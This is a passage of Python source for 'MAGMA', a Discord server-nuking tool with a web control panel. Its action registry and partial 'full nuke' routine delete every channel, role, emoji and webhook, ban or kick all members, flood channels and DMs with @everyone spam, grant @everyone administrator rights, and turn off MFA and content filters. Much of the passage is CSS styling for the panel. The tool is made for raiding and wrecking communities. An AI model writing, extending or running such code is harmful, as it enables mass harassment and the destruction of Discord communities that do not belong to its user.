            await blog("ERROR", f"Failed channel {name} — {err_msg(body, st)}")

    async def _spawn_role(i):
        name = f"{prefix}-{randstr(4)}"
        color = 0xFF2233  # Red theme role
        st, body = await dpost(s, f"/guilds/{SESSION['guild_id']}/roles", json={"name": name, "color": color})
        if is_ok(st): await blog("SUCCESS", f"Created @{name}")
        else: await blog("ERROR", f"Failed @{name} — {err_msg(body, st)}")

    spawn_tasks = [_spawn_and_ping(i) for i in range(ch_count)] + [_spawn_role(i) for i in range(role_count)]
    await parallel(spawn_tasks)

    elapsed = round(time.perf_counter() - t0, 2)
    await blog("SUCCESS", f"⚡ 100X TURBO FULL NUKE SEQUENCE COMPLETED IN {elapsed}s")

# ─────────────────────────────────────────────
#  ACTION REGISTRY
# ─────────────────────────────────────────────

ACTIONS = [
    {"id": "auto_brand",         "label": "★ AUTO BANNER + AVATAR (NAME ONLY)", "category": "brand", "desc": "Type the tool name once — a fresh banner + logo render and the bot renames itself everywhere", "params": [{"key":"tool_name","label":"Tool Name (bot rename target)","type":"text","default":"MAGMA NUKER"}], "fn": exec_auto_brand},
    {"id": "set_watermark",      "label": "SET CUSTOM WATERMARK",          "category": "brand",   "desc": "Your text, stamped into every embed content, description and footer", "params": [{"key":"watermark","label":"Watermark Text","type":"text","default":"⚡ MAGMA NUKER"}], "fn": exec_set_watermark},

    {"id": "full_nuke",          "label": "★ 100X TURBO FULL NUKE",      "category": "nuke",     "desc": "Ultra-fast parallel wipe + instant channel spawns with @everyone pings", "params": [{"key":"server_name","label":"New Server Name","type":"text","default":"MAGMA DOMINATION"},{"key":"ch_count","label":"Spam Channel Count","type":"number","default":50},{"key":"ch_prefix","label":"Channel Prefix","type":"text","default":"magma"},{"key":"role_count","label":"Spam Role Count","type":"number","default":50},{"key":"role_prefix","label":"Role Prefix","type":"text","default":"magma"},{"key":"mm_count","label":"Pings Per Channel","type":"number","default":5},{"key":"mm_msg","label":"Ping Message","type":"text","default":"@everyone ⚡ SERVER NUKED BY MAGMA ⚡"},{"key":"delete_days","label":"Ban Delete Msg Days","type":"number","default":7}], "fn": exec_full_nuke},
    {"id": "delete_channels",    "label": "DELETE ALL CHANNELS",          "category": "destroy",  "desc": "Turbo-deletes all text, voice, and announcement channels", "params": [], "fn": exec_delete_all_channels},
    {"id": "delete_roles",       "label": "DELETE ALL ROLES",             "category": "destroy",  "desc": "Turbo-deletes all unmanaged server roles in parallel", "params": [], "fn": exec_delete_all_roles},
    {"id": "ban_all",            "label": "BAN ALL MEMBERS",              "category": "destroy",  "desc": "Turbo-bans all members except self in parallel with message purge", "params": [{"key":"delete_days","label":"Delete Msg Days (0-7)","type":"number","default":7}], "fn": exec_ban_all},
    {"id": "kick_all",           "label": "KICK ALL MEMBERS",             "category": "destroy",  "desc": "Turbo-kicks all reachable members from guild", "params": [], "fn": exec_kick_all},
    {"id": "purge_messages",     "label": "PURGE ALL MESSAGES",           "category": "destroy",  "desc": "Bulk purges recent messages in all text channels in parallel", "params": [], "fn": exec_purge_messages},
    {"id": "delete_emojis",      "label": "DELETE ALL EMOJIS",            "category": "destroy",  "desc": "Removes all custom server emojis in parallel", "params": [], "fn": exec_delete_emojis},
    {"id": "delete_stickers",    "label": "DELETE ALL STICKERS",          "category": "destroy",  "desc": "Removes all custom server stickers in parallel", "params": [], "fn": exec_delete_stickers},
    {"id": "delete_invites",     "label": "DELETE ALL INVITES",           "category": "destroy",  "desc": "Revokes all active server invites in parallel", "params": [], "fn": exec_delete_invites},
    {"id": "delete_webhooks",    "label": "DELETE ALL WEBHOOKS",          "category": "destroy",  "desc": "Deletes all active webhooks across channels in parallel", "params": [], "fn": exec_delete_webhooks},
    {"id": "delete_integrations","label": "DELETE INTEGRATIONS",          "category": "destroy",  "desc": "Removes bots and third-party integrations in parallel", "params": [], "fn": exec_delete_integrations},
    {"id": "delete_server",      "label": "DELETE SERVER (PERMANENT)",    "category": "destroy",  "desc": "Requires owner token or privileges", "params": [], "fn": exec_delete_server},
    {"id": "ban_specific",       "label": "BAN SPECIFIC USER",            "category": "destroy",  "desc": "Bans single target user ID", "params": [{"key":"ban_uid","label":"Target User ID","type":"text","default":""},{"key":"ban_days","label":"Delete Msg Days","type":"number","default":7}], "fn": exec_ban_specific},
    {"id": "kick_specific",      "label": "KICK SPECIFIC USER",           "category": "destroy",  "desc": "Kicks single target user ID", "params": [{"key":"kick_uid","label":"Target User ID","type":"text","default":""}], "fn": exec_kick_specific},

    {"id": "spam_channels",      "label": "SPAM CREATE CHANNELS",         "category": "spam",     "desc": "Spams channels with instant @everyone pings & watermark", "params": [{"key":"ch_count","label":"Channel Count","type":"number","default":50},{"key":"ch_prefix","label":"Name Prefix","type":"text","default":"magma"}], "fn": exec_spam_channels},
    {"id": "spam_roles",         "label": "SPAM CREATE ROLES",            "category": "spam",     "desc": "Spams colored roles with custom prefix in parallel", "params": [{"key":"role_count","label":"Role Count","type":"number","default":50},{"key":"role_prefix","label":"Name Prefix","type":"text","default":"magma"}], "fn": exec_spam_roles},
    {"id": "mass_message",       "label": "MASS MESSAGE SPAM",            "category": "spam",     "desc": "Spams @everyone ping with MAGMA watermark into all text channels", "params": [{"key":"mm_msg","label":"Message Content","type":"text","default":"@everyone ⚡ SERVER DOMINATED BY MAGMA ⚡"},{"key":"mm_count","label":"Times Per Channel","type":"number","default":5}], "fn": exec_mass_message},
    {"id": "spam_webhooks",      "label": "SPAM CREATE WEBHOOKS",         "category": "spam",     "desc": "Creates webhooks & broadcasts instant @everyone watermark pings", "params": [{"key":"wh_count","label":"Webhooks Per Channel","type":"number","default":5}], "fn": exec_spam_webhooks},
    {"id": "spam_categories",    "label": "SPAM CREATE CATEGORIES",       "category": "spam",     "desc": "Creates multiple channel categories in parallel", "params": [{"key":"cat_count","label":"Count","type":"number","default":20},{"key":"cat_name","label":"Category Name","type":"text","default":"MAGMA DOMAIN"}], "fn": exec_spam_categories},
    {"id": "spam_voice",         "label": "SPAM VOICE CHANNELS",          "category": "spam",     "desc": "Creates multiple voice rooms in parallel", "params": [{"key":"vc_count","label":"Count","type":"number","default":20},{"key":"vc_prefix","label":"Name Prefix","type":"text","default":"magma-vc"}], "fn": exec_spam_voice},
    {"id": "dm_all",             "label": "DM ALL MEMBERS",               "category": "spam",     "desc": "Opens direct messages and broadcasts text with MAGMA watermark", "params": [{"key":"dm_msg","label":"Direct Message Content","type":"text","default":"server dominated by MAGMA"}], "fn": exec_dm_all},

    {"id": "rename_channels",    "label": "RENAME ALL CHANNELS",          "category": "modify",   "desc": "Renames every existing channel in parallel", "params": [{"key":"rename_ch","label":"New Channel Name","type":"text","default":"magma-nuked"}], "fn": exec_rename_channels},
    {"id": "rename_roles",       "label": "RENAME ALL ROLES",             "category": "modify",   "desc": "Renames all roles to one uniform name in parallel", "params": [{"key":"rename_role","label":"New Role Name","type":"text","default":"magma-nuked"}], "fn": exec_rename_roles},
    {"id": "rename_server",      "label": "RENAME SERVER",                "category": "modify",   "desc": "Changes guild name immediately", "params": [{"key":"server_name","label":"New Guild Name","type":"text","default":"MAGMA DOMINATION"}], "fn": exec_rename_server},
    {"id": "rename_bot",         "label": "RE-APPLY BOT IDENTITY",        "category": "brand",    "desc": "Pushes the current tool name, logo and banner to every profile surface again", "params": [], "fn": exec_rename_bot},
    {"id": "grant_admin",        "label": "GRANT @EVERYONE ADMIN",        "category": "modify",   "desc": "Gives Administrator permission to @everyone", "params": [], "fn": exec_grant_admin},
    {"id": "revoke_everyone",    "label": "REVOKE @EVERYONE PERMS",       "category": "modify",   "desc": "Removes all permissions from @everyone", "params": [], "fn": exec_revoke_everyone},
    {"id": "mute_all",           "label": "MUTE ALL MEMBERS",             "category": "modify",   "desc": "Server-mutes all members in parallel", "params": [], "fn": exec_mute_all},
    {"id": "deafen_all",         "label": "DEAFEN ALL MEMBERS",           "category": "modify",   "desc": "Server-deafens all members in parallel", "params": [], "fn": exec_deafen_all},
    {"id": "remove_icon",        "label": "REMOVE SERVER ICON",           "category": "modify",   "desc": "Wipes server profile icon", "params": [], "fn": exec_remove_icon},
    {"id": "change_region",      "label": "CHANGE VOICE REGION",          "category": "modify",   "desc": "Switches guild voice server region", "params": [{"key":"region","label":"Region Key (e.g. us-east)","type":"text","default":"us-east"}], "fn": exec_change_region},
    {"id": "set_verification",   "label": "SET VERIFICATION LEVEL",       "category": "modify",   "desc": "Changes server security verification level", "params": [{"key":"verif_level","label":"Level (0=None, 4=Highest)","type":"number","default":4}], "fn": exec_set_verification},
    {"id": "set_explicit",       "label": "SET EXPLICIT CONTENT FILTER",  "category": "modify",   "desc": "Changes explicit content filter level", "params": [{"key":"explicit_level","label":"Level (0-2)","type":"number","default":0}], "fn": exec_set_explicit},
    {"id": "unban_all",          "label": "UNBAN ALL USERS",              "category": "modify",   "desc": "Lifts all server bans in parallel", "params": [], "fn": exec_unban_all},
    {"id": "create_invites",     "label": "CREATE INVITES (ALL CHANNELS)","category": "modify",   "desc": "Generates infinite vanity invites for every channel in parallel", "params": [], "fn": exec_create_invites},
    {"id": "set_slowmode",       "label": "SET SLOWMODE (ALL CHANNELS)",  "category": "modify",   "desc": "Locks slowmode timer on all text channels in parallel", "params": [{"key":"slowmode_delay","label":"Delay Seconds (e.g. 21600)","type":"number","default":21600}], "fn": exec_set_slowmode},
    {"id": "lock_channels",      "label": "LOCK ALL CHANNELS",            "category": "modify",   "desc": "Revokes SEND_MESSAGES on @everyone across channels in parallel", "params": [], "fn": exec_lock_channels},
    {"id": "unlock_channels",    "label": "UNLOCK ALL CHANNELS",          "category": "modify",   "desc": "Clears lock overrides on all channels in parallel", "params": [], "fn": exec_unlock_channels},
    {"id": "randomize_colors",   "label": "RANDOMIZE ROLE COLORS",        "category": "modify",   "desc": "Applies rainbow hex colors to all roles in parallel", "params": [], "fn": exec_randomize_colors},
    {"id": "toggle_mfa",         "label": "TOGGLE MFA REQUIREMENT",       "category": "modify",   "desc": "Sets 2FA requirement for moderation", "params": [{"key":"mfa_level","label":"Level (0=Disabled, 1=Required)","type":"number","default":0}], "fn": exec_toggle_mfa},
    {"id": "set_afk",            "label": "SET AFK TIMEOUT",              "category": "modify",   "desc": "Sets inactive voice timeout in seconds", "params": [{"key":"afk_timeout","label":"Timeout Seconds","type":"number","default":60}], "fn": exec_set_afk},

    {"id": "check_perms",        "label": "CHECK BOT PERMISSIONS",        "category": "info",     "desc": "Validates bot guild connection and role privileges", "params": [], "fn": exec_check_perms},
    {"id": "list_info",          "label": "LIST SERVER INFO",             "category": "info",     "desc": "Inspects owner, channel count, boost level, and stats", "params": [], "fn": exec_list_info},
    {"id": "list_members",       "label": "LIST MEMBERS",                 "category": "info",     "desc": "Fetches and logs guild member usernames and IDs", "params": [{"key":"list_limit","label":"Max Count (up to 1000)","type":"number","default":100}], "fn": exec_list_members},
    {"id": "list_bans",          "label": "LIST BANS",                    "category": "info",     "desc": "Fetches and displays server ban log", "params": [], "fn": exec_list_bans},
    {"id": "unban_specific",     "label": "UNBAN SPECIFIC USER",          "category": "info",     "desc": "Removes ban from single user ID", "params": [{"key":"unban_uid","label":"Target User ID","type":"text","default":""}], "fn": exec_unban_specific},
    {"id": "export",             "label": "EXPORT SERVER SNAPSHOT",       "category": "info",     "desc": "Dumps channels, roles, emojis, members to JSON file", "params": [], "fn": exec_export},
]

ACTION_MAP = {a["id"]: a for a in ACTIONS}

# ─────────────────────────────────────────────
#  HTML & HIGH-CONTRAST CRIMSON SLATE UI
# ─────────────────────────────────────────────

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MAGMA — 100x Turbo Operations Tool</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Cinzel:wght@700;900&display=swap');

  :root {
    --bg-main:    #0d1117;
    --bg-card:    #161b22;
    --bg-card2:   #1f242c;
    --border:     #30363d;
    --border-hover:#ff4455;
    --red:        #ff3344;
    --red-hover:  #ff5252;
    --red-glow:   0 0 16px rgba(255, 51, 68, 0.45);
    --text-white: #ffffff;
    --text-body:  #c9d1d9;
    --text-dim:   #8b949e;
    --green:      #3fb950;
    --amber:      #d29922;
    --blue:       #58a6ff;
  }

  * { margin:0; padding:0; box-sizing:border-box; }

  body {
    background-color: var(--bg-main);
    color: var(--text-body);
    font-family: 'JetBrains Mono', monospace;
    min-height: 100vh;
    overflow-x: hidden;
    line-height: 1.5;
  }

  #bg-canvas {
    position: fixed; top:0; left:0; width:100%; height:100%;
    pointer-events:none; z-index:0; opacity:.25;
  }

  header {
    position: relative; z-index: 10;
    text-align: center;
    padding: 24px 20px 18px;
    border-bottom: 1px solid var(--border);
    background: linear-gradient(180deg, #1c0e12 0%, var(--bg-main) 100%);
  }

  .logo-wrap {
    display: inline-flex;
    align-items: center;
    gap: 12px;
  }

  .logo {
    font-family: 'Cinzel', serif;
    font-size: clamp(30px, 5vw, 48px);
    font-weight: 900;
    letter-spacing: 10px;
    color: var(--red);
    text-shadow: var(--red-glow), 0 0 40px rgba(255,51,68,0.3);
  }

  .turbo-badge {
    background: linear-gradient(135deg, #ff3344 0%, #ff8800 100%);
    color: #fff;
    font-size: 10px;
    font-weight: 900;
    padding: 3px 8px;
    border-radius: 4px;
    letter-spacing: 2px;
    box-shadow: 0 0 10px rgba(255,51,68,0.5);
  }

  .tagline {
    font-size: 11px;
    letter-spacing: 4px;
    color: var(--text-dim);
    margin-top: 4px;
    text-transform: uppercase;
    font-weight: 600;
  }

  .quick-bar {
    display: flex;
    justify-content: center;
    gap: 10px;
    flex-wrap: wrap;
    margin-top: 14px;
  }
  .btn-quick {
    background: var(--bg-card);
    border: 1px solid var(--border);
    color: var(--text-white);
    padding: 6px 14px;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1px;
    border-radius: 6px;
    cursor: pointer;
    transition: all .2s;
    display: inline-flex;
    align-items: center;
    gap: 6px;
  }
  .btn-quick:hover {
    border-color: var(--red);
    color: var(--red);
    box-shadow: 0 0 10px rgba(255,51,68,0.25);
    transform: translateY(-1px);
  }
  .btn-quick.danger {
    background: linear-gradient(135deg, #b31222 0%, #ff3344 100%);
    border-color: #ff3344;
    color: #fff;
    box-shadow: 0 0 12px rgba(255,51,68,0.35);
  }
  .btn-quick.danger:hover {
    background: linear-gradient(135deg, #d3182b 0%, #ff5252 100%);
    box-shadow: 0 0 20px rgba(255,51,68,0.6);
  }

  #progress-banner {
    display: none;
    position: sticky; top: 0; z-index: 100;
    background: #1e1316;
    border-bottom: 1px solid var(--red);
    box-shadow: 0 4px 20px rgba(0,0,0,0.6);
    padding: 10px 24px;
  }
  #progress-banner.active { display: block; }
  .prog-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 16px;
    max-width: 1400px;
    margin: 0 auto;
    font-size: 12px;
  }
  .prog-status {
    display: flex;
    align-items: center;
    gap: 10px;
    color: var(--text-white);
    font-weight: 700;
    letter-spacing: 1px;
  }
  .prog-spinner {
    width: 14px; height: 14px;
    border: 2px solid var(--red);
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  .prog-track {
    flex: 1; height: 8px;
    background: #2b171c;
    border-radius: 4px;
    overflow: hidden;
    position: relative;
  }
  .prog-fill {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #ff3344, #ff8899);
    box-shadow: 0 0 10px #ff3344;
    transition: width 0.25s ease;
  }
  .btn-abort {
    background: #331518;
    border: 1px solid #ff3344;
    color: #ff8899;
    padding: 4px 12px;
    font-size: 11px;
    font-weight: 700;
    border-radius: 4px;
    cursor: pointer;
  }
  .btn-abort:hover { background: #ff3344; color: #fff; }

  #auth-panel {
    position: relative; z-index: 10;
    max-width: 580px; margin: 40px auto;
    padding: 32px;
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 10px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  }
  #auth-panel h2 {
    font-family: 'Cinzel', serif;
    font-size: 15px;
    letter-spacing: 3px;
    color: var(--red);
    margin-bottom: 20px;
    border-bottom: 1px solid var(--border);
    padding-bottom: 10px;
  }
  .field { margin-bottom: 18px; }
  .field label {
    display: block;
    font-size: 11px;
    letter-spacing: 2px;
    color: var(--text-dim);
    margin-bottom: 8px;
    text-transform: uppercase;
    font-weight: 700;
  }
  .field input {
    width: 100%;
    background: #0d1117;
    border: 1px solid var(--border);
    color: var(--text-white);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    padding: 12px 14px;
    border-radius: 6px;
    outline: none;
    transition: border-color .2s, box-shadow .2s;
  }
  .field input:focus {
    border-color: var(--red);
    box-shadow: 0 0 8px rgba(255, 51, 68, 0.3);
  }
  .btn-auth {
    width: 100%;
    padding: 13px;
    background: linear-gradient(135deg, #b31222 0%, #ff3344 100%);
    border: none;
    border-radius: 6px;
    color: #fff;
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    font-weight: 800;
    letter-spacing: 2px;
    cursor: pointer;
    transition: all .2s;
    box-shadow: 0 4px 15px rgba(255, 51, 68, 0.35);
  }
  .btn-auth:hover {
    background: linear-gradient(135deg, #d3182b 0%, #ff5252 100%);
    box-shadow: 0 6px 20px rgba(255, 51, 68, 0.5);
    transform: translateY(-1px);
  }

  #main {
    display: none;
    position: relative; z-index: 10;
    max-width: 1500px; margin: 0 auto;
    padding: 24px 20px 80px;
  }

  #session-bar {
    display: flex;
    flex-wrap: wrap;
    align-items: center;
    justify-content: space-between;
    gap: 16px;
    padding: 16px 20px;
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 8px;
    margin-bottom: 24px;
    font-size: 12px;
  }
  .sbar-items {
    display: flex;
    flex-wrap: wrap;
    gap: 24px;
  }
  .sbar-item { display: flex; flex-direction: column; gap: 2px; }
  .sbar-label { color: var(--text-dim); letter-spacing: 2px; font-size: 9px; text-transform: uppercase; font-weight: 700; }
  .sbar-val { color: var(--text-white); font-weight: 700; }
  .sbar-val.highlight { color: var(--red); }
  .sbar-actions { display: flex; gap: 10px; }
  .btn-sbar {
    background: #21262d;
    border: 1px solid var(--border);
    color: var(--text-body);
    padding: 6px 14px;
    border-radius: 6px;
    font-size: 11px;
    cursor: pointer;
    font-weight: 700;
    transition: all .2s;
  }
  .btn-sbar:hover { border-color: var(--red); color: var(--red); }

  .control-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 12px;
    margin-bottom: 20px;
  }
  .filter-tabs {
    display: flex; gap: 8px; flex-wrap: wrap;
  }
  .tab {
    padding: 7px 16px;
    border: 1px solid var(--border);
    background: var(--bg-card);
    color: var(--text-dim);
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1px;
    border-radius: 6px;
    cursor: pointer;
    text-transform: uppercase;
    transition: all .2s;
  }
  .tab.active, .tab:hover {
    border-color: var(--red);
    color: var(--text-white);
    background: #25161b;
  }
  .tab.active { box-shadow: 0 0 10px rgba(255,51,68,0.25); }
  .search-wrap {
    min-width: 260px;
  }
  .search-input {
    width: 100%;
    background: var(--bg-card);
    border: 1px solid var(--border);
    color: var(--text-white);
    padding: 8px 14px;
    border-radius: 6px;
    font-size: 12px;
    font-family: 'JetBrains Mono', monospace;
    outline: none;
  }
  .search-input:focus { border-color: var(--red); }

  #actions-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 14px;
    margin-bottom: 28px;
  }

  .action-card {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 16px;
    transition: all .2s;
    position: relative;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    gap: 12px;
  }
  .action-card:hover {
    border-color: var(--border-hover);
    transform: translateY(-2px);
    box-shadow: 0 6px 18px rgba(0,0,0,0.4);
    background: #1b212a;
  }
  .action-card.in-queue {
    border-color: var(--amber);
    background: #1f1f1d;
  }
  .action-card.card-nuke {
    border-color: rgba(255, 51, 68, 0.4);
    background: linear-gradient(180deg, #221014 0%, var(--bg-card) 100%);
  }
  .action-card.card-nuke:hover {
    border-color: var(--red);
    box-shadow: var(--red-glow);
  }

  .card-top {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .card-category {
    font-size: 9px;
    font-weight: 800;
    letter-spacing: 2px;
    text-transform: uppercase;
    padding: 2px 8px;
    border-radius: 4px;
  }
  .cat-destroy  { background: rgba(255, 51, 68, 0.15); color: #ff5252; border: 1px solid rgba(255, 51, 68, 0.3); }
  .cat-spam     { background: rgba(210, 153, 34, 0.15); color: #e3a936; border: 1px solid rgba(210, 153, 34, 0.3); }
  .cat-modify   { background: rgba(163, 113, 247, 0.15); color: #b88eff; border: 1px solid rgba(163, 113, 247, 0.3); }
  .cat-info     { background: rgba(88, 166, 255, 0.15); color: #79b8ff; border: 1px solid rgba(88, 166, 255, 0.3); }
  .cat-nuke     { background: rgba(255, 51, 68, 0.25); color: #ff3344; border: 1px solid var(--red); font-weight: 900; }
  .cat-brand    { background: rgba(255, 200, 40, 0.15); color: #ffd75e; border: 1px solid rgba(255, 200, 40, 0.35); font-weight: 900; }

  .card-title {
    font-size: 13px;
    font-weight: 700;
    color: var(--text-white);
    letter-spacing: 0.5px;
    line-height: 1.3;
  }
  .card-desc {
    font-size: 11px;
    color: var(--text-dim);
    line-height: 1.4;
    min-height: 32px;
  }

  .card-actions {
    display: flex;
    gap: 8px;
    margin-top: 4px;
  }
  .btn-card-run {
    flex: 2;
    background: #ff3344;
    color: #fff;
    border: none;
    padding: 8px 12px;
    border-radius: 5px;
    font-size: 11px;
    font-weight: 800;
    letter-spacing: 1px;
    cursor: pointer;
    transition: all .2s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
  .btn-card-run:hover {
    background: #ff5252;
    box-shadow: 0 0 10px rgba(255, 51, 68, 0.4);
  }
  .btn-card-queue {
    flex: 1;
    background: #21262d;
    border: 1px solid var(--border);
    color: var(--text-body);
    padding: 8px;
    border-radius: 5px;
    font-size: 11px;
    font-weight: 700;
    cursor: pointer;
    transition: all .2s;
  }
  .btn-card-queue:hover {
    border-color: var(--amber);
    color: var(--amber);
  }
  .btn-card-cfg {
    background: #21262d;
    border: 1px solid var(--border);
    color: var(--text-dim);
    padding: 8px 10px;
    border-radius: 5px;
    font-size: 11px;
    cursor: pointer;
    transition: all .2s;
  }
  .btn-card-cfg:hover {
    border-color: var(--text-white);
    color: var(--text-white);
  }

  .workspace-bottom {
    display: grid;
    grid-template-columns: 360px 1fr;
    gap: 20px;
  }
  @media (max-width: 980px) {
    .workspace-bottom { grid-template-columns: 1fr; }
  }

  #queue-panel {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 20px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
  }
  .panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 16px;
    border-bottom: 1px solid var(--border);
    padding-bottom: 10px;
  }
  .panel-title {
    font-size: 12px;
    font-weight: 800;
    letter-spacing: 2px;
    color: var(--text-white);
    display: flex;
    align-items: center;
    gap: 8px;
  }
  #queue-count {
    background: var(--amber);
    color: #000;
    font-size: 10px;
    font-weight: 900;
    padding: 1px 7px;
    border-radius: 10px;
  }
  #queue-list {
    flex: 1;
    max-height: 300px;
    overflow-y: auto;
    margin-bottom: 16px;
  }
  .empty-queue {
    color: var(--text-dim);
    font-size: 11px;
    text-align: center;
    padding: 30px 10px;
  }
  .queue-item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    background: #0d1117;
    border: 1px solid var(--border);
    border-radius: 5px;
    padding: 8px 10px;
    margin-bottom: 6px;
    font-size: 11px;
  }
  .queue-item-left {
    display: flex;
    align-items: center;
    gap: 8px;
    overflow: hidden;
  }
  .queue-item-num { color: var(--amber); font-weight: 800; min-width: 18px; }
  .queue-item-name { color: var(--text-white); font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .queue-item-del {
    color: var(--text-dim);
    cursor: pointer;
    font-size: 14px;
    font-weight: 800;
  }
  .queue-item-del:hover { color: var(--red); }

  .queue-actions {
    display: flex;
    gap: 10px;
  }
  .btn-exec-queue {
    flex: 2;
    background: linear-gradient(135deg, #b31222 0%, #ff3344 100%);
    border: none;
    color: #fff;
    padding: 12px;
    border-radius: 6px;
    font-size: 12px;
    font-weight: 800;
    letter-spacing: 2px;
    cursor: pointer;
    transition: all .2s;
  }
  .btn-exec-queue:hover { background: linear-gradient(135deg, #d3182b 0%, #ff5252 100%); box-shadow: 0 0 14px rgba(255,51,68,0.4); }
  .btn-exec-queue:disabled { opacity: .4; cursor: not-allowed; }
  .btn-clear-queue {
    flex: 1;
    background: #21262d;
    border: 1px solid var(--border);
    color: var(--text-dim);
    border-radius: 6px;
    font-size: 11px;
    font-weight: 700;
    cursor: pointer;
  }
  .btn-clear-queue:hover { border-color: var(--red); color: var(--red); }

  #log-panel {
    background: #090d13;
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 18px;
    display: flex;
    flex-direction: column;
  }
  .log-pulse-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 8px var(--green);
    animation: blink 1.5s infinite;
  }
  .log-ctrls {
    display: flex;
    gap: 8px;
  }
  .btn-log-ctrl {
    background: #161b22;
    border: 1px solid var(--border);
    color: var(--text-dim);
    font-size: 10px;
    padding: 3px 10px;
    border-radius: 4px;
    cursor: pointer;
    font-weight: 700;
  }
  .btn-log-ctrl:hover { color: var(--text-white); border-color: var(--text-dim); }

  #log-output {
    height: 320px;
    overflow-y: auto;
    font-size: 11px;
    line-height: 1.6;
    margin-top: 10px;
    padding-right: 6px;
    scrollbar-width: thin;
    scrollbar-color: var(--border) transparent;
  }
  #log-output::-webkit-scrollbar { width: 5px; }
  #log-output::-webkit-scrollbar-track { background: transparent; }
  #log-output::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

  .log-line {
    display: flex;
    gap: 10px;
    padding: 2px 0;
    border-bottom: 1px solid rgba(255,255,255,0.02);
  }
  .log-ts   { color: var(--text-dim); min-width: 65px; font-weight: 600; }
  .log-lvl  { min-width: 65px; font-weight: 800; }
  .log-lvl.SUCCESS { color: var(--green); }
  .log-lvl.ERROR   { color: var(--red); }
  .log-lvl.INFO    { color: var(--blue); }
  .log-lvl.WARN    { color: var(--amber); }
  .log-lvl.ACTION  { color: #ff88ff; font-weight: 900; }
  .log-msg { color: var(--text-body); flex: 1; word-break: break-all; }
  .log-msg.SUCCESS { color: #56d364; }
  .log-msg.ERROR   { color: #ff7b72; font-weight: 600; }
  .log-msg.ACTION  { color: #ffa2ff; font-weight: 700; }

  #modal-overlay {
    display: none;
    position: fixed; inset: 0;
    background: rgba(0, 0, 0, 0.75);
    backdrop-filter: blur(4px);
    z-index: 1000;
    align-items: center;
    justify-content: center;
  }
  #modal-overlay.open { display: flex; }
  #modal {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 10px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
    padding: 28px;
    min-width: 380px;
    max-width: 480px;
    width: 90%;
    animation: popIn 0.2s ease;
  }
  #modal h3 {
    font-size: 14px;
    font-weight: 800;
    color: var(--text-white);
    margin-bottom: 8px;
  }
  #modal-desc {
    font-size: 11px;
    color: var(--text-dim);
    margin-bottom: 20px;
    border-bottom: 1px solid var(--border);
    padding-bottom: 10px;
  }
  .modal-btns {
    display: flex;
    gap: 10px;
    margin-top: 24px;
  }
  .btn-modal-run {
    flex: 1.5;
    background: #ff3344;
    border: none;
    color: #fff;
    padding: 10px;
    border-radius: 6px;
    font-size: 11px;
    font-weight: 800;
    cursor: pointer;
  }
  .btn-modal-run:hover { background: #ff5252; box-shadow: 0 0 10px rgba(255,51,68,0.4); }
  .btn-modal-queue {
    flex: 1.5;
    background: #21262d;
    border: 1px solid var(--border);
    color: var(--amber);
    padding: 10px;
    border-radius: 6px;
    font-size: 11px;
    font-weight: 800;
    cursor: pointer;
  }
  .btn-modal-queue:hover { border-color: var(--amber); background: #2b2b24; }
  .btn-modal-close {
    flex: 1;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text-dim);
    padding: 10px;
    border-radius: 6px;
    font-size: 11px;
    cursor: pointer;
  }
  .btn-modal-close:hover { color: var(--text-white); border-color: var(--text-dim); }

  /* ── CUSTOM BRANDING PANEL ── */
  #brand-panel {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 18px;
    background: linear-gradient(180deg, #191216 0%, var(--bg-card) 100%);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 18px 20px;
    margin-bottom: 24px;
  }
  @media (max-width: 900px) { #brand-panel { grid-template-columns: 1fr; } }
  #brand-panel > div { min-width: 0; }
  .brand-head {
    font-size: 11px;
    font-weight: 800;
    letter-spacing: 2px;
    color: var(--text-white);
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    gap: 8px;
    flex-wrap: wrap;
  }
  .brand-hint {
    font-size: 9px;
    letter-spacing: 1px;
    font-weight: 600;
    color: var(--text-dim);
    text-transform: uppercase;
  }
  .brand-row { display: flex; gap: 8px; }
  .brand-row input {
    flex: 1;
    min-width: 0;
    background: #0d1117;
    border: 1px solid var(--border);
    color: var(--text-white);
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    padding: 9px 12px;
    border-radius: 6px;
    outline: none;
  }
  .brand-row input:focus { border-color: var(--red); box-shadow: 0 0 8px rgba(255,51,68,0.25); }
  .btn-brand {
    background: linear-gradient(135deg, #b31222 0%, #ff3344 100%);
    border: none;
    color: #fff;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
